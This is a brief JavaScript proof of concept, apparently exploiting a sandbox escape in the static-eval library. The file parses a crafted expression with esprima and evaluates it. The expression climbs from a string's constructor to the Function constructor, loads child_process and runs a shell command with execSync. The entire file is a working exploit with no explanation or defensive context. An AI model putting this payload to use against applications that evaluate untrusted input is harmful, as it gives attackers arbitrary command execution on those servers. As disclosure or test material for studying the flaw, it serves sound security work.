const parse = require('esprima').parse
const evaluate = require('static-eval')

const program = '(function myTag(y){return ""[!y?"__proto__":"constructor"][y]})("constructor")("console.log(process.mainModule.constructor._load(\'child_process\').execSync(\'ls\').toString())")()'

const ast = parse(program).body[0].expression
let result = evaluate(ast)
